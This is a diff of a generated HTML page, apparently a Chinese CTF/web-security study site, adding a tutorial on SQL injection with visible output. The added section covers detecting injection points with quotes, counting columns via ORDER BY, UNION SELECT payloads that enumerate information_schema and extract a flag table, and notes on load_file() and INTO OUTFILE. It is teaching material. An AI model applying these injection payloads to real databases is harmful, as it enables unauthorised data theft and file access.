@@ -784,6 +784,24 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#sql_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      有回显的SQL注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      无回显的SQL注入
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1088,6 +1106,24 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#sql_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      有回显的SQL注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      无回显的SQL注入
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1135,20 +1171,20 @@
 <span class="normal"><a href="#__codelineno-0-4">4</a></span>
 <span class="normal"><a href="#__codelineno-0-5">5</a></span>
 <span class="normal"><a href="#__codelineno-0-6">6</a></span>
-<span class="normal"><a href="#__codelineno-0-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a>SHOW DATABASES;  /*输出所有的数据库*/
+<span class="normal"><a href="#__codelineno-0-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">DATABASES</span><span class="p">;</span><span class="w">  </span><span class="cm">/*输出所有的数据库*/</span>
 <a id="__codelineno-0-2" name="__codelineno-0-2"></a>
-<a id="__codelineno-0-3" name="__codelineno-0-3"></a>USE db_name;  /*使用某个其中一个数据库*/
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">USE</span><span class="w"> </span><span class="n">db_name</span><span class="p">;</span><span class="w">  </span><span class="cm">/*使用某个其中一个数据库*/</span>
 <a id="__codelineno-0-4" name="__codelineno-0-4"></a>
-<a id="__codelineno-0-5" name="__codelineno-0-5"></a>SHOW TABLES;  /*显示数据库中的表*/
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span><span class="w">  </span><span class="cm">/*显示数据库中的表*/</span>
 <a id="__codelineno-0-6" name="__codelineno-0-6"></a>
-<a id="__codelineno-0-7" name="__codelineno-0-7"></a>SHOW COLUMNS FROM table_name;  /*输出列*/
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span><span class="w">  </span><span class="cm">/*输出列*/</span>
 </code></pre></div></td></tr></table></div>
 <ul>
 <li><strong>查询指令</strong></li>
 </ul>
 <p><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
-<span class="normal"><a href="#__codelineno-1-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a>SELECT field1, field2,...fieldN (FROM table_name1, table_name2..
-<a id="__codelineno-1-2" name="__codelineno-1-2"></a>[WHERE condition1 [AND [OR]] condition2...])
+<span class="normal"><a href="#__codelineno-1-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">field1</span><span class="p">,</span><span class="w"> </span><span class="n">field2</span><span class="p">,...</span><span class="n">fieldN</span><span class="w"> </span><span class="p">(</span><span class="k">FROM</span><span class="w"> </span><span class="n">table_name1</span><span class="p">,</span><span class="w"> </span><span class="n">table_name2</span><span class="p">..</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="p">[</span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition1</span><span class="w"> </span><span class="p">[</span><span class="k">AND</span><span class="w"> </span><span class="p">[</span><span class="k">OR</span><span class="p">]]</span><span class="w"> </span><span class="n">condition2</span><span class="p">...])</span>
 </code></pre></div></td></tr></table></div>
 从table_name表中查询条件符合condition的field列中的元素</p>
 <p>field可以替换为*，代指所有列</p>
@@ -1167,21 +1203,21 @@
 <span class="normal"><a href="#__codelineno-2-12">12</a></span>
 <span class="normal"><a href="#__codelineno-2-13">13</a></span>
 <span class="normal"><a href="#__codelineno-2-14">14</a></span>
-<span class="normal"><a href="#__codelineno-2-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a>SELECT col_name FROM table_name /*从特定表中获取特定列*/
+<span class="normal"><a href="#__codelineno-2-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="cm">/*从特定表中获取特定列*/</span>
 <a id="__codelineno-2-2" name="__codelineno-2-2"></a>
-<a id="__codelineno-2-3" name="__codelineno-2-3"></a>SELECT * FROM table_name /*从特定表中获取全部列*/
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="cm">/*从特定表中获取全部列*/</span>
 <a id="__codelineno-2-4" name="__codelineno-2-4"></a>
-<a id="__codelineno-2-5" name="__codelineno-2-5"></a>SELECT * FROM table_name WHERE col_name = XXX /*在限定条件下取数据*/ 
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">col_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XXX</span><span class="w"> </span><span class="cm">/*在限定条件下取数据*/</span><span class="w"> </span>
 <a id="__codelineno-2-6" name="__codelineno-2-6"></a>
-<a id="__codelineno-2-7" name="__codelineno-2-7"></a>SELECT * FROM table_name ORDER BY col_name(col_index) /*根据列名或索引排序*/
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">col_name</span><span class="p">(</span><span class="n">col_index</span><span class="p">)</span><span class="w"> </span><span class="cm">/*根据列名或索引排序*/</span>
 <a id="__codelineno-2-8" name="__codelineno-2-8"></a>
-<a id="__codelineno-2-9" name="__codelineno-2-9"></a>SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /*从第N(从0开始)条开始，返回M条数据*/
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="n">col_name2</span><span class="err">…</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="n">N</span><span class="p">,</span><span class="w"> </span><span class="n">M</span><span class="w">  </span><span class="cm">/*从第N(从0开始)条开始，返回M条数据*/</span>
 <a id="__codelineno-2-10" name="__codelineno-2-10"></a>
-<a id="__codelineno-2-11" name="__codelineno-2-11"></a>SELECT col_name1, col_name2… FROM table_name LIMIT M OFFSET N  /*也可以这么写*/
+<a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="n">col_name2</span><span class="err">…</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="n">M</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="n">N</span><span class="w">  </span><span class="cm">/*也可以这么写*/</span>
 <a id="__codelineno-2-12" name="__codelineno-2-12"></a>
-<a id="__codelineno-2-13" name="__codelineno-2-13"></a>SELECT concat(col_name1, col_name2…) FROM table_name /*整合列数据*/
+<a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="n">col_name2</span><span class="err">…</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="cm">/*整合列数据*/</span>
 <a id="__codelineno-2-14" name="__codelineno-2-14"></a>
-<a id="__codelineno-2-15" name="__codelineno-2-15"></a>SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/
+<a id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="n">col_name2</span><span class="err">…</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="cm">/*整合行、列数据*/</span>
 </code></pre></div></td></tr></table></div>
 <ul>
 <li><strong>注释方式</strong></li>
@@ -1195,16 +1231,16 @@
 <span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
 <span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
 <span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-3-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>/*
-<a id="__codelineno-3-2" name="__codelineno-3-2"></a>这是注释，支持多行
-<a id="__codelineno-3-3" name="__codelineno-3-3"></a>*/
+<span class="normal"><a href="#__codelineno-3-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="cm">/*</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="cm">这是注释，支持多行</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="cm">*/</span>
 <a id="__codelineno-3-4" name="__codelineno-3-4"></a>
-<a id="__codelineno-3-5" name="__codelineno-3-5"></a>-- 这也是注释(注意后面有个空格)
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="c1">-- 这也是注释(注意后面有个空格)</span>
 <a id="__codelineno-3-6" name="__codelineno-3-6"></a>
-<a id="__codelineno-3-7" name="__codelineno-3-7"></a># 这还是注释 
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="o">#</span><span class="w"> </span><span class="err">这还是注释</span><span class="w"> </span>
 <a id="__codelineno-3-8" name="__codelineno-3-8"></a>
-<a id="__codelineno-3-9" name="__codelineno-3-9"></a>/*!version_number 当数据库版本大于version_number(或version_number为空)时
-<a id="__codelineno-3-10" name="__codelineno-3-10"></a>注释内容会被执行，否则就是普通注释*/
+<a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="cm">/*!version_number 当数据库版本大于version_number(或version_number为空)时</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="cm">注释内容会被执行，否则就是普通注释*/</span>
 </code></pre></div></td></tr></table></div>
 <ul>
 <li><strong>注入常用函数</strong></li>
@@ -1231,30 +1267,118 @@
 <span class="normal"><a href="#__codelineno-4-20">20</a></span>
 <span class="normal"><a href="#__codelineno-4-21">21</a></span>
 <span class="normal"><a href="#__codelineno-4-22">22</a></span>
-<span class="normal"><a href="#__codelineno-4-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>SELECT user(); /* 获取当前数据库用户 */
+<span class="normal"><a href="#__codelineno-4-23">23</a></span>
+<span class="normal"><a href="#__codelineno-4-24">24</a></span>
+<span class="normal"><a href="#__codelineno-4-25">25</a></span>
+<span class="normal"><a href="#__codelineno-4-26">26</a></span>
+<span class="normal"><a href="#__codelineno-4-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">();</span><span class="w"> </span><span class="cm">/* 获取当前数据库用户 */</span>
 <a id="__codelineno-4-2" name="__codelineno-4-2"></a>
-<a id="__codelineno-4-3" name="__codelineno-4-3"></a>SELECT database(); /* 获取当前数据库名 */
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">database</span><span class="p">();</span><span class="w"> </span><span class="cm">/* 获取当前数据库名 */</span>
 <a id="__codelineno-4-4" name="__codelineno-4-4"></a>
-<a id="__codelineno-4-5" name="__codelineno-4-5"></a>SELECT schema_name FROM information_schema.schemata; /*查询默认库得到所有数据库名*/
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span><span class="w"> </span><span class="cm">/*查询默认库得到所有数据库名*/</span>
 <a id="__codelineno-4-6" name="__codelineno-4-6"></a>
-<a id="__codelineno-4-7" name="__codelineno-4-7"></a>SELECT version(); /* 获取当前使用的数据库版本 */
+<a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span><span class="w"> </span><span class="cm">/*查询数据库下的所有表名*/</span>
 <a id="__codelineno-4-8" name="__codelineno-4-8"></a>
-<a id="__codelineno-4-9" name="__codelineno-4-9"></a>SELECT @@datadir; /* 获取数据库存储数据的路径 */
+<a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;table_name&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span><span class="w"> </span><span class="cm">/*查询表中的所有列名*/</span>
 <a id="__codelineno-4-10" name="__codelineno-4-10"></a>
-<a id="__codelineno-4-11" name="__codelineno-4-11"></a>SELECT concat_ws(&#39;分隔符&#39;, col_name1, col_name2...) FROM table_name; /* 使用 concat_ws() 联合列数据，并指定分隔符 */
+<a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">();</span><span class="w"> </span><span class="cm">/* 获取当前使用的数据库版本 */</span>
 <a id="__codelineno-4-12" name="__codelineno-4-12"></a>
-<a id="__codelineno-4-13" name="__codelineno-4-13"></a>SELECT hex(col_name) FROM table_name; /* 使用 hex() 进行编码 */
+<a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="n">datadir</span><span class="p">;</span><span class="w"> </span><span class="cm">/* 获取数据库存储数据的路径 */</span>
 <a id="__codelineno-4-14" name="__codelineno-4-14"></a>
-<a id="__codelineno-4-15" name="__codelineno-4-15"></a>SELECT unhex(hex_col_name) FROM table_name; /* 使用 unhex() 进行解码 */
+<a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">concat_ws</span><span class="p">(</span><span class="s1">&#39;分隔符&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="n">col_name2</span><span class="p">...)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span><span class="w"> </span><span class="cm">/* 使用 concat_ws() 联合列数据，并指定分隔符 */</span>
 <a id="__codelineno-4-16" name="__codelineno-4-16"></a>
-<a id="__codelineno-4-17" name="__codelineno-4-17"></a>SELECT load_file(&#39;文件路径&#39;); /* 使用 load_file() 以文本方式读取文件，路径在 Windows 中设置为 \ */
+<a id="__codelineno-4-17" name="__codelineno-4-17"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">col_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span><span class="w"> </span><span class="cm">/* 使用 hex() 进行编码 */</span>
 <a id="__codelineno-4-18" name="__codelineno-4-18"></a>
-<a id="__codelineno-4-19" name="__codelineno-4-19"></a>SELECT &#39;数据内容&#39; INTO OUTFILE &#39;文件路径&#39;; /* 在具有高权限时，将数据内容写入文件 */
+<a id="__codelineno-4-19" name="__codelineno-4-19"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">unhex</span><span class="p">(</span><span class="n">hex_col_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span><span class="w"> </span><span class="cm">/* 使用 unhex() 进行解码 */</span>
 <a id="__codelineno-4-20" name="__codelineno-4-20"></a>
-<a id="__codelineno-4-21" name="__codelineno-4-21"></a>ASCII() /*得到字符ASCII码值*/
+<a id="__codelineno-4-21" name="__codelineno-4-21"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;文件路径&#39;</span><span class="p">);</span><span class="w"> </span><span class="cm">/* 使用 load_file() 以文本方式读取文件，路径在 Windows 中设置为 \ */</span>
 <a id="__codelineno-4-22" name="__codelineno-4-22"></a>
-<a id="__codelineno-4-23" name="__codelineno-4-23"></a>CHAR() /*把ASCII码值转化为对应的字符*/
+<a id="__codelineno-4-23" name="__codelineno-4-23"></a><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;数据内容&#39;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;文件路径&#39;</span><span class="p">;</span><span class="w"> </span><span class="cm">/* 在具有高权限时，将数据内容写入文件 */</span>
+<a id="__codelineno-4-24" name="__codelineno-4-24"></a>
+<a id="__codelineno-4-25" name="__codelineno-4-25"></a><span class="n">ASCII</span><span class="p">()</span><span class="w"> </span><span class="cm">/*得到字符ASCII码值*/</span>
+<a id="__codelineno-4-26" name="__codelineno-4-26"></a>
+<a id="__codelineno-4-27" name="__codelineno-4-27"></a><span class="nb">CHAR</span><span class="p">()</span><span class="w"> </span><span class="cm">/*把ASCII码值转化为对应的字符*/</span>
 </code></pre></div></td></tr></table></div>
+<h3 id="sql_1">有回显的SQL注入<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h3>
+<p>有回显即可以看到查询出的所有内容。</p>
+<p>最简单的可被注入的语句有以下两种</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name</span><span class="p">(</span><span class="err">…</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">{}</span><span class="w">       </span><span class="cm">/*数字型*/</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name</span><span class="p">(</span><span class="err">…</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{}&#39;</span><span class="w">     </span><span class="cm">/*字符型*/</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="cm">/* {}替换为输入的内容 */</span>
+</code></pre></div></td></tr></table></div>
+<p>除此之外还可能有括号，双引号等</p>
+<p>所以首先就要判断是字符型查询还是数字型或是其他</p>
+<p>首先传入所有特殊符号'"~!@#$%^&amp;*()`，如果报错大概率是字符型</p>
+<p>比如对于 <code>SELECT col_name(…) FROM table_name WHERE id = '{}'</code>,我们可以输入一个单引号，使其变成 <code>SELECT col_name(…) FROM table_name WHERE id = '''</code>,这样就会多出来一个单引号引发报错。</p>
+<p>此外，还可以通过输入一个数学表达式如1+1，如果查询时发现式子被计算了，则是数字型。</p>
+<p>确定查询语句后，就可以开始注入。</p>
+<p>因为可以直接看到注入的回显，我们可以使用union语句查询自己想要的内容</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">field1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">fieldN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">field1</span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">fieldN</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="o">*</span><span class="p">;</span>
+</code></pre></div></td></tr></table></div>
+<p>如传入<code>1' UNION SELECT {secret_data} #</code> 组成 <code>SELECT col_name(…) FROM table_name WHERE id = '1' UNION SELECT {secret_data} # '</code></p>
+<p>注意，UNION语句前后查询的列数应当是一样的，否则会报错。</p>
+<p>我们可以尝试构造
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">col_nameN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">M</span><span class="p">;</span>
+</code></pre></div></td></tr></table></div></p>
+<p>即将查询到的内容按第M列排序</p>
+<ul>
+<li>
+<p>M&lt;=N时，能有正常的返回</p>
+</li>
+<li>
+<p>M&gt;N时，报错</p>
+</li>
+</ul>
+<p>然后我们就可以使用UNION查询其他的表，通过使用以下函数获得表名/列名</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">5</a></span>
+<span class="normal"><a href="#__codelineno-8-6">6</a></span>
+<span class="normal"><a href="#__codelineno-8-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">database</span><span class="p">();</span><span class="w"> </span><span class="cm">/* 获取当前数据库名 */</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span><span class="w"> </span><span class="cm">/*查询默认库得到所有数据库名*/</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span><span class="w"> </span><span class="cm">/*查询数据库下的所有表名*/</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;table_name&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span><span class="w"> </span><span class="cm">/*查询表中的所有列名*/</span>
+</code></pre></div></td></tr></table></div>
+<p>例如构造如下查询指令进行查询</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">col_nameN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
+</code></pre></div></td></tr></table></div>
+<p>假设我们发现了flag表，就可以构造注入语句。</p>
+<p>如果查出users表中有三列，而flag表中只有一列，我们可以添加几个数字来凑齐三列。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span>
+</code></pre></div></td></tr></table></div>
+<p>得到</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>user</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>adminpass</td>
+</tr>
+<tr>
+<td>1</td>
+<td>2</td>
+<td>flag1{},flag2,others</td>
+</tr>
+</tbody>
+</table>
+<p>这样就拿到了有效信息。</p>
+<h3 id="sql_2">无回显的SQL注入<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h3>
+<p>无回显即不显示查询到的内容，一般返回是否查询到内容。</p>
+<p>可以通过<strong>布尔盲注</strong>进行查询：</p>
 <h2 id="_1">杂项知识<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 
 
